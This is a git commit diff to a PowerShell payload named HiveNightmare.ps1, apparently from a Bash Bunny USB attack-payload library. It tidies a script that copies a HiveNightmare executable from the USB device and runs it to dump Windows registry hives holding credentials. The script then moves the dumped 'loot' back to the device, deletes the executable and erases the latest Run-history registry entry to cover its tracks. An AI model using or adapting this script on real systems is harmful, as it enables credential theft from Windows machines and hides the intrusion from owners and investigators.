862bf8fb41140e72149eab0028e28b6f05fa8233
hitem <patrik@boi.se>
2021-07-26 00:16:59 +0200

    Update HiveNightmare.ps1
    Tidy up the code to be more unified.
    Changed the delete run history string to only include latest run, rather then whole //thanks kZ3

--- payloads/library/exfiltration/HiveNightmare/HiveNightmare.ps1
+++ payloads/library/exfiltration/HiveNightmare/HiveNightmare.ps1
@@ -4,27 +4,31 @@
 # Author: hitem
 ###############################
 
-#VARIABLES
+### VARIABLES
 $mytemp = [environment]::getfolderpath(“mydocuments”)
-#Edit Source to fit your Switch. Switch1-2 is used instead of Tools as the file has to be copied localy
+# Edit Source to fit your Switch. Switch1-2 is used instead of Tools as the file has to be copied localy
 $source = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\switch1\HiveNightmare.exe')
 $destination = "$mytemp\hive"
 $loot = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\')
 $order66 = "$mytemp\hive\HiveNightmare.exe"
 
-#EXECUTION
-#Create workdirr in mydocuments
+### EXECUTION
+# Create workdirr in mydocuments
 New-Item -ItemType Directory -Force -Path "$mytemp\hive"
 Start-Sleep 1
-#Copy that sweet thing to mydocuments
-copy-item -Path $source -Destination $destination -recurse -force
+
+# Copy that sweet thing to mydocuments
+Copy-Item -Path $source -Destination $destination -recurse -force
 Start-Sleep 1
-#Start the hivenightmare.exe and then remove it after 6 seconds
-#The start-sleep is requiered so the *.exe has time to run and collect the files
-Start-process -FilePath $order66 -WorkingDirectory $destination
-start-sleep 6
-#Extract loot with move-item to clear trace in my documents
+
+# Start the hivenightmare.exe and then remove it after 6 seconds
+# The start-sleep is requiered so the *.exe has time to run and collect the files
+Start-Process -FilePath $order66 -WorkingDirectory $destination
+Start-Sleep 6
 Remove-Item $order66 -force -Confirm:$false
-move-item -Path $destination -Destination $loot[0] -force
-#Delete "run" history
-Remove-item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force
+
+# Extract loot with move-item to clear trace in my documents
+Move-Item -Path $destination -Destination $loot[0] -force
+
+# Delete last entry in Run
+$p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"; $m = "MRUList"; $l=(gp $p).$m; rp $p $l[0]; sp $p $m $l.Substring(1);
